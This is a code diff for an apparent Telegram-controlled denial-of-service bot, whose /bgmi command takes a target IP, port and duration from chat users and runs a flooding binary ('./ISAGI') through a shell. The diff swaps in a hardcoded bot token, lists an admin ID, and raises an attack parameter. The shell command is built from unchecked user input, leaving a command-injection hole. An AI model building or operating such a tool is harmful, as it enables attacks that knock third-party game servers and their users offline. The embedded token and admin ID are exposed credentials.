@@ -7,7 +7,7 @@ import os
 
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7331564546:AAFGI8BBcdpA_zlim82bcCXkcxC-40eWy-c')
+bot = telebot.TeleBot('7331564546:AAEPHleqZwvo0EVB3ubpKTueoQ4hfPEFoa4')
 
 # Admin user IDs
 admin_id = {"6353114118"}
@@ -209,7 +209,7 @@ def start_attack_reply(message, target, port, time):
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =0
+COOLDOWN_TIME = 0
 
 # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
@@ -237,9 +237,9 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./ISAGI {target} {port} {time} 900"
+                full_command = f"./ISAGI {target} {port} {time} 1200"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} time: {time}"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
